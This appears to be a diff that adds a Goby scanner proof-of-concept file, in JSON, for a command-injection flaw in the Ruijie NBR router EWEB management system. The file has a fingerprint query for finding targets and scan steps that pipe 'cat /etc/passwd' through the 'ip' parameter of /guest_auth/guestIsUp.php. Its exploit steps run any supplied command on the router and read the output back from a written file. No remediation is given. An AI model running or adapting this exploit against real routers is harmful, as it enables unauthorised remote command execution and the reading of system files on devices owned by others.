@@ -1,0 +1,137 @@
+{
+      "Name": "锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞",
+      "Level": "3",
+      "Tags": [
+            "远程命令执行"
+      ],
+      "GobyQuery": "(app=\"Ruijie-EG\" || title=\"锐捷网络-EWEB网管系统\" || app=\"Ruijie--EWEB\")",
+      "Description": "锐捷NBR路由器 EWEB网管系统部分接口存在命令注入，导致远程命令执行获取权限",
+      "Product": "锐捷NBR路由器 EWEB网管系统",
+      "Homepage": "http://www.ruijie.com.cn/",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "cat /etc/passwd",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+			{
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/guest_auth/guestIsUp.php",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "mac=1&ip=127.0.0.1|cat /etc/passwd > PeiQi.txt"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/guest_auth/guestIsUp.php",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "!=",
+                                    "value": "404",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "not contains",
+                                    "value": "File not found.",
+                                    "bz": ""
+                              },
+							  {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "not contains",
+                                    "value": ">__<",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/guest_auth/guestIsUp.php",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "mac=1&ip=127.0.0.1|{{{Cmd}}} > PeiQi.txt"
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				]
+            },
+			{
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/guest_auth/PeiQi.txt",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-01-26 10:37:09",
+      "GobyVersion": "1.8.230"
+}
